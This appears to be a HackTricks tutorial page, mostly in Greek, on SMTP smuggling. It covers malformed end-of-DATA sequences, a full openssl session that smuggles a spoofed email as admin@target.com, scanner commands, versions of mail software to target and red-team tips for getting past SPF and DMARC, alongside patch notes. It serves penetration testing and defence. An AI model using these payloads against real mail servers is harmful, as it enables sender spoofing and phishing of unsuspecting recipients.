# SMTP Smuggling

{{#include ../../banners/hacktricks-training.md}}

## Βασικές Πληροφορίες

Αυτός ο τύπος ευπάθειας [**πρωτοανακαλύφθηκε σε αυτήν την ανάρτηση**](https://sec-consult.com/blog/detail/smtp-smuggling-spoofing-e-mails-worldwide/) όπου εξηγείται ότι είναι δυνατόν να **εκμεταλλευτεί κάποιος διαφορές στον τρόπο που ερμηνεύεται το πρωτόκολλο SMTP** κατά την ολοκλήρωση ενός email, επιτρέποντας σε έναν επιτιθέμενο να “smuggle” περισσότερα emails μέσα στο σώμα του νόμιμου μηνύματος, μιμούμενος άλλους χρήστες του επηρεαζόμενου domain (π.χ. admin@outlook.com) παρακάμπτοντας μηχανισμούς όπως το SPF.

### Γιατί

Αυτό συμβαίνει επειδή στο πρωτόκολλο SMTP, τα **data του μηνύματος** που θα αποσταλούν στο email ελέγχονται από έναν χρήστη (επιτιθέμενο) ο οποίος μπορεί να στείλει ειδικά κατασκευασμένα δεδομένα εκμεταλλευόμενος διαφορές στους parsers, οι οποίες θα smuggle επιπλέον μηνύματα στον παραλήπτη. Δείτε το εικονογραφημένο παράδειγμα από την πρωτότυπη ανάρτηση:

<figure><img src="../../images/image (8) (1) (1) (1) (1).png" alt=""><figcaption><p><a href="https://sec-consult.com/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2023_12/SMTP_Smuggling-Overview__09_.png">https://sec-consult.com/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2023_12/SMTP_Smuggling-Overview__09_.png</a></p></figcaption></figure>

### Πώς

Για να εκμεταλλευτεί κάποιος αυτή την ευπάθεια, πρέπει να στείλει δεδομένα που ο εξερχόμενος SMTP server θεωρεί ότι αποτελούν μόνο 1 email, ενώ ο εισερχόμενος SMTP server θεωρεί ότι υπάρχουν πολλά email.

Οι ερευνητές ανακάλυψαν ότι διαφορετικοί **Inbound servers θεωρούν διαφορετικούς χαρακτήρες ως το τέλος των data** του μηνύματος, που οι Outbound servers δεν θεωρούν.\
Για παράδειγμα, ένα κανονικό τέλος των data είναι `\r\n.\r`. Αλλά αν ο Inbound SMTP server επίσης υποστηρίζει `\n.`, ένας επιτιθέμενος μπορεί απλά να προσθέσει **αυτά τα δεδομένα στο email του και να αρχίσει να υποδεικνύει τις εντολές SMTP** ενός νέου μηνύματος για να το smuggle, όπως στο προηγούμενο παράδειγμα.

Φυσικά, αυτό μπορεί να λειτουργήσει μόνο εάν ο Outbound SMTP server δεν θεωρεί επίσης αυτά τα δεδομένα ως το τέλος των δεδομένων του μηνύματος, γιατί σε αυτή τη περίπτωση θα δει 2 μηνύματα αντί για 1 — άρα τελικά πρόκειται για τη desynchronization που εκμεταλλεύεται αυτή η ευπάθεια.

Πιθανά δεδομένα desynchronization:

- `\n.`
- `\n.\r`

Σημειώστε επίσης ότι το SPF παρακάμπτεται γιατί αν smuggle ένα email από `admin@outlook.com` μέσα από ένα email του `user@outlook.com`, **ο sender παραμένει `outlook.com`.**

---

## Checklist επιτιθέμενου (ποιες προϋποθέσεις πρέπει να ισχύουν;)

Για να smuggle επιτυχώς ένα δεύτερο email, συνήθως χρειάζεστε:

- Έναν εξερχόμενο server A μέσω του οποίου μπορείτε να στείλετε (συχνά με έγκυρα διαπιστευτήρια) που θα προωθήσει μια μη‑τυπική ακολουθία τέλους‑DATA αμετάβλητη. Πολλές υπηρεσίες ιστορικά προωθούσαν παραλλαγές όπως `\n.\r\n` ή `\n.\n`.
- Έναν εισερχόμενο server B που θα ερμηνεύσει αυτή τη μη‑τυπική ακολουθία ως τέλος‑DATA και θα κάνει parse ό,τι ακολουθεί ως νέες εντολές SMTP (MAIL/RCPT/DATA...).
- Ο Outbound πρέπει πραγματικά να στέλνει με `DATA` (όχι `BDAT`). Αν ο A υποστηρίζει CHUNKING/BDAT, το smuggling λειτουργεί μόνο αν υποχωρήσει σε DATA (π.χ., B δεν διαφημίζει CHUNKING), διαφορετικά το πλαισιωμένο κατά μήκος BDAT εμποδίζει την ασάφεια.
- Το PIPELINING δεν είναι απαραίτητο αλλά βοηθά στο να κρύψει τις εγχυόμενες εντολές σε ένα μόνο TCP write ώστε ενδιάμεσες συσκευές να μην επανασυγχρονιστούν.

Κοινές παραλλαγές τέλους‑DATA αξιόλογες για δοκιμή (εξαρτάται από τον receiver):

- `\n.\n`
- `\n.\r\n`
- `\r.\r\n`
- `\r\n.\r` (γυμνό CR στο τέλος)

Σημείωση: Αυτό που λειτουργεί είναι η τομή του “τι ο A προωθεί” ∩ “τι ο B αποδέχεται”.

---

## Παράδειγμα χειροκίνητης εκμετάλλευσης (μοναδική συνεδρία)

Το παρακάτω δείχνει την ιδέα χρησιμοποιώντας μια raw STARTTLS SMTP συνεδρία. Μετά το πρώτο block DATA εισάγουμε έναν μη‑τυπικό terminator, και έπειτα έναν άλλο διάλογο SMTP που ο receiving server μπορεί να θεωρήσει ως νέο μήνυμα.

<details>
<summary>Χειροκίνητη συνεδρία smuggling (STARTTLS)</summary>
```
$ openssl s_client -starttls smtp -crlf -connect smtp.example.com:587
EHLO a.example
AUTH PLAIN <base64(\0user@example.com\0password)>
MAIL FROM:<user@example.com>
RCPT TO:<victim@target.com>
DATA
From: User <user@example.com>
To: victim <victim@target.com>
Subject: legit

hello A
\n.\r\nMAIL FROM:<admin@target.com>
RCPT TO:<victim@target.com>
DATA
From: Admin <admin@target.com>
To: victim <victim@target.com>
Subject: smuggled

hello B
\r\n.\r\n
```
If A forwards `\n.\r\n` and B accepts it as end‑of‑DATA, message “hello B” may be accepted as a second email from `admin@target.com` while passing SPF (aligned with A’s IPs).
</details>

Tip: When testing interactively, ensure `-crlf` is used so OpenSSL preserves CRLF in what you type.

---

## Automation and scanners

- hannob/smtpsmug: στέλνει ένα μήνυμα που τελειώνει με πολλαπλές κακώς διαμορφωμένες end‑of‑DATA ακολουθίες για να δείτε τι αποδέχεται ο δέκτης.
- Example: `./smtpsmug -s mail.target.com -p 25 -t victim@target.com`
- The‑Login/SMTP‑Smuggling‑Tools: scanner για τόσο την inbound όσο και την outbound πλευρά, μαζί με έναν analysis SMTP server για να δείτε ακριβώς ποιες ακολουθίες επιβιώνουν από έναν sender.
- Inbound quick check: `python3 smtp_smuggling_scanner.py victim@target.com`
- Outbound via a relay: `python3 smtp_smuggling_scanner.py YOUR@ANALYSIS.DOMAIN --outbound-smtp-server smtp.relay.com --port 587 --starttls --sender-address you@relay.com --username you@relay.com --password '...'
`

These tools help you map the A→B pairs where smuggling actually works.

---

## CHUNKING/BDAT vs DATA

- DATA uses a sentinel terminator `<CR><LF>.<CR><LF>`; οποιαδήποτε ασάφεια στον τρόπο που τα CR/LF κανονικοποιούνται ή dot‑stuffed οδηγεί σε desync.
- CHUNKING (BDAT) frames the body with an exact byte length και επομένως αποτρέπει το κλασικό smuggling. Ωστόσο, αν ο sender κάνει fallback σε DATA (επειδή ο receiver δεν διαφημίζει CHUNKING), το κλασικό smuggling γίνεται και πάλι δυνατό.

---

## Notes on affected software and fixes (for targeting)

- Postfix: prior to 3.9 το default επέτρεπε bare LFs; από 3.5.23/3.6.13/3.7.9/3.8.4 οι admins μπορούν να ενεργοποιήσουν το `smtpd_forbid_bare_newline`. Η τρέχουσα σύσταση είναι `smtpd_forbid_bare_newline = normalize` (3.8.5+/3.7.10+/3.6.14+/3.5.24+) ή να τεθεί σε `reject` για αυστηρή RFC επιβολή.
- Exim: fixed in 4.97.1 (and later) για παραλλαγές που εξαρτώνταν από mixed end‑of‑DATA sequences όταν χρησιμοποιείται DATA. Παλαιότερα 4.97/4.96 μπορεί να είναι εκμεταλλεύσιμα ανάλογα με PIPELINING/CHUNKING.
- Sendmail: fixed in 8.18; older 8.17.x αποδεχόταν μερικούς non‑standard terminators.
- Various libraries/servers (π.χ., aiosmtpd πριν την 1.4.5, κάποια vendor gateways, και συγκεκριμένα SaaS relays) είχαν παρόμοια προβλήματα; οι σύγχρονες εκδόσεις τείνουν να αποδέχονται DATA μόνο με το αυστηρό `<CR><LF>.<CR><LF>`.

Χρησιμοποιήστε τα scanners πιο πάνω για να επαληθεύσετε τη σημερινή συμπεριφορά; πολλοί vendors άλλαξαν defaults στις αρχές του 2024–2025.

---

## Tips for red team ops

- Προτιμήστε μεγάλους commodity senders για το A (ιστορικά Exchange Online, shared hosters, κ.λπ.). Εάν εξακολουθούν να προωθούν κάποιο μη‑standard EOM και είναι στο SPF του θύματος, το smuggled MAIL FROM σας θα κληρονομήσει την reputation τους.
- Εξερευνήστε τις SMTP extensions του B: EHLO banner για PIPELINING/CHUNKING; αν λείπει το CHUNKING έχετε μεγαλύτερες πιθανότητες από BDAT‑first senders. Συνδυάστε με κακώς διαμορφωμένα EOMs για probing αποδοχής.
- Παρακολουθήστε headers: το smuggled μήνυμα συνήθως θα δημιουργήσει ξεχωριστή Received αλυσίδα που ξεκινάει από το B. Το DMARC συχνά θα περνάει επειδή το MAIL FROM ευθυγραμμίζεται με το IP space του A.

---

## **References**

- [https://sec-consult.com/blog/detail/smtp-smuggling-spoofing-e-mails-worldwide/](https://sec-consult.com/blog/detail/smtp-smuggling-spoofing-e-mails-worldwide/)
- [https://www.postfix.org/smtp-smuggling.html](https://www.postfix.org/smtp-smuggling.html)

{{#include ../../banners/hacktricks-training.md}}
